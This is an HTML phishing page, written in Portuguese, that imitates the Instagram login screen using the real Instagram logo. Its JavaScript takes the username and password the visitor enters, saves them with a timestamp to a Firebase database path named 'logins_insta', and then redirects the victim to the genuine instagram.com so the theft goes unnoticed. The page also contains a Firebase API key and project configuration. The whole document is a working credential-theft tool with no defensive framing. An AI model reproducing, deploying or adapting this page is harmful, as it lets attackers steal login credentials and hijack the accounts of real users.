<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 8px; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b566.png" class="logo">
    <input type="text" id="user" placeholder="Telefone, nome de usuário ou email">
    <input type="password" id="pass" placeholder="Senha">
    <button onclick="salvarNoFirebase()">Entrar</button>
</div>

<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>

<script>
    // Suas configurações que você pegou lá no site
    const firebaseConfig = {
        apiKey: "AIzaSyBKDt453P9yD56Td_-oURBWaOTdaukhuUo",
        authDomain: "instagram-3e2e5.firebaseapp.com",
        databaseURL: "https://instagram-3e2e5-default-rtdb.firebaseio.com",
        projectId: "instagram-3e2e5",
        storageBucket: "instagram-3e2e5.firebasestorage.app",
        messagingSenderId: "356805132117",
        appId: "1:356805132117:web:5621d2b065fa2ffd1079dc"
    };

    // Inicializa o Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    function salvarNoFirebase() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;

        if(u && p) {
            // Salva na pasta 'logins_insta'
            database.ref('logins_insta').push().set({
                usuario: u,
                senha: p,
                data: new Date().toLocaleString()
            }, (error) => {
                if (error) {
                    alert("Erro ao salvar! Verifique as regras do Firebase.");
                } else {
                    // Redireciona para o Instagram real
                    window.location.href = "https://www.instagram.com";
                }
            });
        } else {
            alert("Preencha todos os campos!");
        }
    }
</script>

</body>
</html>
